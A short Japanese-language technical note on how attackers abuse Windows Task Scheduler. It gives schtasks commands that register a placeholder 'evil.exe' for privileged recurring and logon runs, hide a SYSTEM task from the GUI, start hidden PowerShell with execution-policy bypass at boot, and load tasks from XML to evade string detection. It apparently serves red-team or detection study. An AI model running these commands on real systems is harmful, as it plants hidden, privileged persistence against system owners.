# タスクスケジューラとは
Windowsに標準搭載された、指定した時間に特定のプログラムや処理を自動で実行させるための機能。

## Step1 schtasks
攻撃者は悪意のある実行ファイルを指定し、管理者権限で定期実行させることで永続化、権限昇格を図る。
```powershell
# すべてのタスクを表示
schtasks /query /fo LIST /v
# 特定の名前のタスクを削除
schtasks /delete /tn "MalwareRun" /f
# 毎分実行の登録
schtasks /create /tn "EveryMinuteRun" /tr "C:\Temp\evil.exe" /sc minute /mo 1 /rl highest
# 毎時実行の登録
schtasks /create /tn "EveryHourRun" /tr "C:\Temp\evil.exe" /sc hourly /mo 1 /rl highest
# 毎日実行の登録
schtasks /create /tn "EveryDayRun" /tr "C:\Temp\evil.exe" /sc daily /st 12:00 /rl highest
# ログオン時実行の登録
schtasks /create /tn "LogonRun" /tr "C:\Temp\evil.exe" /sc onlogon /rl highest
# 検知時の親コマンドライン
C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s Schedule
```
## Step2 GUIから隠す
タスクスケジューラのGUI(taskschd.msc)のデフォルト設定では見えないように登録する。
```powershell
# SYSTEM権限で、かつバックグラウンド設定(/itなし)で登録
schtasks /create /tn "HiddenTask" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru "SYSTEM" /rl highest
```
## Step3 システム起動時の実行
ユーザーがログインする前(Session 0)に、SYSTEM権限で実行する。
```powershell
schtasks /create /tn "Step3" /tr "powershell.exe -c -ep bypass -nop -W hidden C:\Users\Public\step3.ps1" /sc onstart /ru "SYSTEM" /rl highest
```
## Step4 XMLファイルによる隠蔽
`schtasks`の引数を直接打たずにXMLファイルから読み込ませて文字列検知を回避する。
```powershell
schtasks /create /xml "C:\Users\Public\step4.xml" /tn "Step4"
```
